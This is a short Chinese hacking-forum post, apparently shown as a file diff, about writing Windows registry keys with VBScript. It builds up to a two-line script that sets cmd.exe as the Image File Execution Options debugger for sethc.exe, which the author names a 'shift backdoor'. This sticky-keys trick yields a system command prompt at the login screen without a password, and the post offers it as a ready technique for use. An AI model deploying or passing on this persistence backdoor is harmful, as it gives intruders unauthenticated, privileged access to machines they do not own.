@@ -1,0 +1,22 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+利用vbs创建注册表值
+D8888D主贴内容-------------------------------------------------------
+作者：lcx
+
+利用vbs创建注册表值较简单，创建注册表项的话，网上多是用wmi来，例如代码：
+
+const HKEY_LOCAL_MACHINE = &H80000002
+strComputer = "."
+Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &_
+strComputer & "\root\default:StdRegProv")
+strKeyPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"  ‘创建sethc.exe项
+oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath
+难道WshShell 对象的RegWrite 方法真的不可以吗？我仔细研究了一下，只需要在要加入的项后加\就可以，例如
+
+Set WshShell = WScript.CreateObject("WScript.Shell")
+WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\","","REG_SZ"所以我们创建shift后门的话，两句话就可以。
+
+Set WshShell = WScript.CreateObject("WScript.Shell")
+WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\debugger",WScript.CreateObject("WScript.shell").ExpandEnvironmentStrings("%SystemRoot%")&"\system32\cmd.exe","REG_SZ"
